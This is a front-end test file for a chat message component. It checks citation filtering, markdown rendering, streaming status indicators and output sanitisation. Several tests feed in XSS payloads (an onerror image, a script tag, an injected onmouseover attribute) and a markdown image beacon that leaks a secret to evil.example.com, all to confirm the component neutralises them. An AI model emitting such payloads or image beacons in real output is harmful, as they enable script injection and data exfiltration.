import { cleanup, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it } from "vitest";

import type { ChatSource } from "@/lib/api/search";

import { ChatMessage, type Message } from "./ChatMessage";

function source(number: number, overrides: Partial<ChatSource> = {}): ChatSource {
  return {
    document_id: `doc-${number}`,
    document_key: `doc-key-${number}`,
    document_title: `Document ${number}`,
    score: 0.9,
    number,
    chunk_order: number,
    snippet: `Snippet ${number}`,
    ...overrides,
  };
}

function assistantMessage(content: string, sources: ChatSource[]): Message {
  return { id: "m1", role: "assistant", content, sources };
}

afterEach(cleanup);

describe("ChatMessage sources", () => {
  it("lists only the sources actually cited in the answer", () => {
    const sources = [1, 2, 3, 4, 5].map((n) => source(n));
    render(<ChatMessage message={assistantMessage("The mission is a rescue [5].", sources)} />);

    expect(screen.getByText("Document 5")).toBeInTheDocument();
    for (const n of [1, 2, 3, 4]) {
      expect(screen.queryByText(`Document ${n}`)).not.toBeInTheDocument();
    }
  });

  it("keeps every cited source when several are cited", () => {
    const sources = [1, 2, 3].map((n) => source(n));
    render(<ChatMessage message={assistantMessage("Fact one [1]. Fact three [3].", sources)} />);

    expect(screen.getByText("Document 1")).toBeInTheDocument();
    expect(screen.queryByText("Document 2")).not.toBeInTheDocument();
    expect(screen.getByText("Document 3")).toBeInTheDocument();
  });

  it("falls back to listing all sources when the answer has no citation markers", () => {
    const sources = [1, 2].map((n) => source(n));
    render(<ChatMessage message={assistantMessage("An answer without citations.", sources)} />);

    expect(screen.getByText("Document 1")).toBeInTheDocument();
    expect(screen.getByText("Document 2")).toBeInTheDocument();
  });

  it("falls back to listing all sources when no marker matches a source number", () => {
    const sources = [1, 2].map((n) => source(n));
    render(<ChatMessage message={assistantMessage("A stray citation [9].", sources)} />);

    expect(screen.getByText("Document 1")).toBeInTheDocument();
    expect(screen.getByText("Document 2")).toBeInTheDocument();
  });

  it("keeps the original citation numbers on the filtered list", () => {
    const sources = [1, 2, 3, 4, 5].map((n) => source(n));
    render(<ChatMessage message={assistantMessage("Rescue mission [5].", sources)} />);

    const list = screen.getByRole("list");
    expect(list).toHaveTextContent("[5]");
    expect(list).not.toHaveTextContent("[1]");
  });

  it("still renders inline citation links for cited sources", () => {
    const sources = [1, 2].map((n) => source(n));
    render(<ChatMessage message={assistantMessage("See [2].", sources)} />);

    const links = screen.getAllByRole("link", { name: "[2]" });
    expect(links.length).toBeGreaterThan(0);
    expect(links[0]).toHaveAttribute("href", "/documents/doc-key-2#chunk-2");
  });

  it("lists all sources while the answer is still streaming", () => {
    const sources = [1, 2, 3].map((n) => source(n));
    render(
      <ChatMessage
        message={{ id: "m1", role: "assistant", content: "Partial answer [1]", sources, streaming: true }}
      />,
    );

    expect(screen.getByText("Document 1")).toBeInTheDocument();
    expect(screen.getByText("Document 2")).toBeInTheDocument();
    expect(screen.getByText("Document 3")).toBeInTheDocument();
  });
});

describe("ChatMessage markdown", () => {
  it("renders assistant markdown as formatted HTML", () => {
    render(
      <ChatMessage
        message={assistantMessage("### Key Passages\n\n- **Bold item**\n- Second item", [])}
      />,
    );

    expect(screen.getByRole("heading", { name: "Key Passages" })).toBeInTheDocument();
    expect(screen.getByRole("list")).toBeInTheDocument();
    expect(screen.getByText("Bold item").tagName).toBe("STRONG");
  });

  it("keeps citation markers as links inside formatted markdown", () => {
    render(<ChatMessage message={assistantMessage("## Title\n\nA cited claim [1].", [source(1)])} />);

    expect(screen.getByRole("heading", { name: "Title" })).toBeInTheDocument();
    const link = screen.getAllByRole("link", { name: "[1]" })[0];
    expect(link).toHaveAttribute("href", "/documents/doc-key-1#chunk-1");
    // Marks the chip so markdown link styling doesn't underline it.
    expect(link).toHaveAttribute("data-citation", "1");
  });

  it("leaves an uncitable marker as literal text", () => {
    render(<ChatMessage message={assistantMessage("No such source [9].", [source(1)])} />);

    expect(screen.queryByRole("link", { name: "[9]" })).not.toBeInTheDocument();
    expect(screen.getByText(/No such source \[9\]\./)).toBeInTheDocument();
  });

  it("strips dangerous markup from assistant content", () => {
    render(
      <ChatMessage
        message={assistantMessage('Hello <img src=x onerror="alert(1)"> <script>alert(2)</script>', [])}
      />,
    );

    expect(document.querySelector("script")).toBeNull();
    expect(document.querySelector("img[onerror]")).toBeNull();
  });

  it("shows a labelled thinking indicator before the first token arrives", () => {
    render(
      <ChatMessage message={{ id: "m1", role: "assistant", content: "", streaming: true }} />,
    );

    const status = screen.getByRole("status");
    expect(status).toHaveTextContent(/searching/i);
  });

  it("says it is writing the answer once sources have arrived", () => {
    render(
      <ChatMessage
        message={{
          id: "m1",
          role: "assistant",
          content: "",
          streaming: true,
          sources: [source(1)],
        }}
      />,
    );

    expect(screen.getByRole("status")).toHaveTextContent(/writing/i);
  });

  it("replaces the thinking indicator with the answer once text streams in", () => {
    render(
      <ChatMessage
        message={{ id: "m1", role: "assistant", content: "Partial answer", streaming: true }}
      />,
    );

    expect(screen.queryByRole("status")).not.toBeInTheDocument();
    expect(screen.getByText("Partial answer")).toBeInTheDocument();
  });

  it("shows no thinking indicator on a finished message", () => {
    render(<ChatMessage message={assistantMessage("Done.", [])} />);

    expect(screen.queryByRole("status")).not.toBeInTheDocument();
  });

  it("does not render markdown for user messages", () => {
    render(<ChatMessage message={{ id: "u1", role: "user", content: "# not a heading" }} />);

    expect(screen.queryByRole("heading")).not.toBeInTheDocument();
    expect(screen.getByText("# not a heading")).toBeInTheDocument();
  });

  it("leaves bracketed numbers inside code untouched", () => {
    render(
      <ChatMessage
        message={assistantMessage("Use `arr[1]` here.\n\n```js\nconsole.log(arr[1]);\n```", [
          source(1),
        ])}
      />,
    );

    const code = document.querySelectorAll("code");
    expect(code.length).toBeGreaterThan(0);
    for (const el of code) {
      expect(el.querySelector("a")).toBeNull();
      expect(el.textContent).toContain("arr[1]");
    }
  });

  it("does not rewrite a citation-shaped label on a real markdown link", () => {
    render(
      <ChatMessage message={assistantMessage("See [1](https://example.com) for details.", [source(1)])} />,
    );

    const link = screen.getByRole("link", { name: "1" });
    expect(link).toHaveAttribute("href", "https://example.com");
    expect(screen.queryByText(/\(https:\/\/example\.com\)/)).not.toBeInTheDocument();
  });

  it("links a citation that appears inside a list item or table cell", () => {
    render(
      <ChatMessage message={assistantMessage("- A cited bullet [1]\n- Another bullet", [source(1)])} />,
    );

    const link = screen.getAllByRole("link", { name: "[1]" })[0];
    expect(link.closest("li")).not.toBeNull();
  });

  it("drops images from assistant markdown", () => {
    render(
      <ChatMessage
        message={assistantMessage("![beacon](https://evil.example.com/p.png?leak=secret)", [])}
      />,
    );

    expect(document.querySelector("img")).toBeNull();
  });

  it("escapes snippet text used in the citation tooltip", () => {
    const src = source(1, { snippet: '" onmouseover="alert(1)' });
    render(<ChatMessage message={assistantMessage("Claim [1].", [src])} />);

    const link = screen.getAllByRole("link", { name: "[1]" })[0];
    expect(link).not.toHaveAttribute("onmouseover");
    expect(link.getAttribute("title")).toContain('" onmouseover="alert(1)');
  });
});
